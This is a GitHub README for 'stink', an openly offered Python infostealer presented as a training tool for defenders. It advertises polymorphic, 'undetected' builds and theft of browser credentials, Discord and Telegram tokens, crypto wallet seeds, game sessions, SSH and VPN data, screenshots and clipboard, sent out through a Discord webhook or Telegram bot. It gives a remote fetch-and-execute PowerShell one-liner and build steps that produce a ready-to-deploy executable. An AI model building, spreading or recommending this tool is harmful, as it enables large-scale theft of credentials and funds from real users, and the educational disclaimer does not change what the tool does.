<div align="center">

<img src=".github/.stink-logo.png" alt="stink" width="400">

### the cutest python-native infostealer

![badges](https://shieldcn.dev/group/badge/python-3.16+badge/undetected-26.06+github/commits/FallenAstaroth/stink+badge/status-beta-blue+badge/license-apache-green.svg?variant=secondary&size=xs)

**stink is currently wip; make sure to star the repo so you dont miss when it comes out!**

sharpen your detection skills against a real-world infostealer threat. this open-source tool is made for security folks *(like you and me :3)* to practice spotting and responding to live malware campaigns.

[about](#-about) · [features](#-features) · [build](#-build)

---

</div>

## <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Memo.webp" alt="📝" width="25" height="25" /> about

**stink** is a really cute nextgen python-based infostealer designed to help defenders train to detect, analyze, and respond to infostealer campaigns. infostealers (redline, vidar, raccoon, lumma, etc.) are among the most prevalent threats targeting credentials, session tokens, crypto wallets, and browser data.

## <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Animals%20and%20Nature/Fire.webp" alt="🔥" width="25" height="25" /> features

| type | capability |
|---|---|
| **polymorphism** | each build is fully unique; 2 builds cant be correlated to eachother in any way |
| **browsers** | chromium-based browsers (v149+ app-bound encryption bypass), firefox-based browsers (nss3.dll native implementation) |
| **social** | discord token, future-proof discord injection, telegram session extraction (file whitelist, reduces log size), whatsapp, signal, tox, element, icq, viber, tiktok |
| **crypto** | 40+ wallet hash extraction (metamask, phantom, trust, exodus, etc), future-proof exodus injection (password + seed on login), wallet/2fa extension data |
| **games** | roblox cookie extraction (2 methods), steam session extraction (2 methods), minecraft session extraction (mojang, ms store, lunar, feather, polymc, badlion, prism, rise) |
| **system** | vpn, ssh, ftp, git client extraction, sensitive file scraping by keywords, system info (specs, software list, screenshot, clipboard) |

---

## <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Laptop.webp" alt="💻" width="25" height="25" /> build

building a fully ready to use agent takes less than 5 minutes and is easier than brewing up some coffee.

### prerequisites
- [discord](https://discord.com/) webhook, or telegram [bot token](https://t.me/BotFather) and [chat id](https://t.me/WhatChatIDBot)
- [python 3+](https://www.python.org/downloads/) *(auto-downloaded if using the powershell script)*
- windows 10/11 or windows server 2019+

### powershell
fastest way to get the builder running, automatically gets all missing dependencies.
```
irm https://raw.githubusercontent.com/FallenAstaroth/stink/refs/heads/main/build.ps1 | iex
```

### manual
```
git clone github.com/FallenAstaroth/stink
cd stink
pip install -r requirements.txt
python ./build.py
```

### output
a build results in a ready-to-deploy .exe file with a random filename, located in the `out/` folder


> *note: builds are designed for security research in controlled environments.*

---

<div align="center">

distributed under [apache](LICENSE). &nbsp;&middot;&nbsp; made with <3 for defenders. &nbsp;&middot;&nbsp; helped you? star the repo! ^_^

<sup>*this repository contains a source code archive provided strictly for educational and security research purposes, including malware analysis, reverse engineering study, threat intelligence, detection rule development, and academic research. unauthorized use against systems you do not own or lack explicit written permission to test is illegal under laws including the computer fraud and abuse act (us), the computer misuse act (uk), and equivalent legislation. by accessing this repository, you agree not to compile, execute, or distribute this code for any malicious purpose, assume full legal responsibility for any misuse, and acknowledge the repository owner disclaims all liability for damages or legal consequences resulting from improper use. if you are not a security researcher, student, or professional engaged in legitimate study, do not download or use this code.*</sup>

</div>








